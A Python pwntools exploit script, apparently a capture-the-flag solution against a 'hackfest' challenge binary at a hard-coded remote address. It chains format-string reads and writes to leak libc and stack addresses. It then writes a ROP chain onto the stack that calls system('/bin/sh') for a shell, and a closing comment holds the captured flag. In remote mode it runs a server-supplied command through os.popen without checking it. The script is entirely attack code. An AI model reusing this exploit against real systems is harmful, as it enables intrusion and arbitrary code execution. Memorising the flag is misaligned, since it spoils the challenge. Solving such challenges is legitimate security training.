#!/usr/bin/env python
from pwn import *
from time import sleep
import os

exe = ELF("./main")
libc = ELF("./libc.so.6")

context.binary = exe

sshc = None
r = None
nc = "nc 20.122.85.188 1339"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0.3

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=0x100, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
        
        r.recvuntil(b"proof of work: ")
        cmd = r.readline().strip().decode()
        
        outbuf = os.popen(cmd)
        ans = outbuf.read().strip().encode()
        
        r.sendline(ans)
    
    return r


def write(adr, data):
    global r
    
    if data == 0:
        payload = b""
        payload += "%{}$n%{}$n".format(35, 36).encode()
        payload += padPayload(payload, 0x100, 2, 8)
        payload += p64(adr)
        payload += p64(adr+4)
        
        #pause()
        sendl(payload)
        return
    
    chunks = [{"val": (data & (0xffff << i)) >> i, "idx": i//16} for i in range(0, 64, 16) if (data & (0xffff << i)) >> i != 0]
    chunks.sort(key=lambda x: x["val"])
    
    payload = b""
    for i in range(len(chunks)):
        if i == 0:
            prev = 0
        else:
            prev = chunks[i-1]["val"]
        
        payload += "%{}x%{}$hn".format(chunks[i]["val"]-prev, 36-len(chunks)+1+chunks[i]["idx"]).encode()
        
    payload += padPayload(payload, 0x100, len(chunks), 8)
    
    for i in range(len(chunks)):
        payload += p64(adr+2*i)
    
    #pause()
    sendl(payload)
    return


def main():
    global r
    r = conn()
    
    payload = b"%10x%36$n.%39$p.%43$p."
    payload += padPayload(payload, 0x100, 1, 8)
    payload += p64(exe.symbols.rounds)
    
    sendl(payload)
    
    r.recvuntil(b".")
    libc_base = int(r.recvuntil(b".")[:-1].decode(), 16) - 0x29d90
    
    logh("libc_base", libc_base)
    
    pop_rsi = libc_base + 0x00000000000da97d
    pop_rdi = libc_base + 0x000000000002a3e5
    pop_rdx = libc_base + 0x000000000011f497
    binsh = libc_base + next(libc.search(b"/bin/sh"))
    system = libc_base + libc.symbols.system
    
    stack_ret_adr = int(r.recvuntil(b".")[:-1].decode(), 16) - 0x110
    logh("stack_ret_adr", stack_ret_adr)
    
    write(stack_ret_adr, pop_rdi)
    write(stack_ret_adr+8, binsh)
    write(stack_ret_adr+8*2, pop_rsi)
    write(stack_ret_adr+8*3, 0)
    write(stack_ret_adr+8*4, pop_rdx)
    write(stack_ret_adr+8*5, 0)
    write(stack_ret_adr+8*6, 0)
    write(stack_ret_adr+8*7, system)
    
    
    r.interactive() # hackfest{e55aef552cf30d479709f601f64281e5ff939b992e47481824d61cd8b3d6bacb}



if __name__ == "__main__":
    main()

